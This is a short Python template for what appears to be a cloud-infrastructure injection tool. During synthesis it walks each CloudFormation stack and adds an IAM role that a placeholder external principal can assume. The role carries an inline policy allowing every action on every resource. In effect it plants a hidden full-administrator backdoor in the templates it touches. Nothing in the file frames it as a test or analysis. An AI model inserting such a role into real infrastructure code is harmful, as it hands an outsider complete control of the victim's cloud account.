import json

def cfni(synth):
    logical_id = "{{.LogicalID}}"
    principal = "{{.Principal}}"

    for assembly in synth.assemblies:
        for stack in assembly.stacks:
            if stack.has_resource(logical_id):
                return
            
            stack.set_resource(logical_id, {
                "Type": "AWS::IAM::Role",
                "Properties": {
                    "AssumeRolePolicyDocument": json.dumps({
                        "Version": "2012-10-17",
                        "Statement": [
                            {
                                "Effect": "Allow",
                                "Principal": {
                                    "AWS": principal.strip()
                                },
                                "Action": "sts:AssumeRole"
                            }
                        ]
                    }),
                    "Policies": [
                        {
                            "PolicyName": "default",
                            "PolicyDocument": {
                                "Version": "2012-10-17",
                                "Statement": [
                                    {
                                        "Effect": "Allow",
                                        "Action": "*",
                                        "Resource": "*"
                                    }
                                ]
                            }
                        }
                    ]
                }
            })
            
            synth.add_update(stack.absolute_filename, stack.template)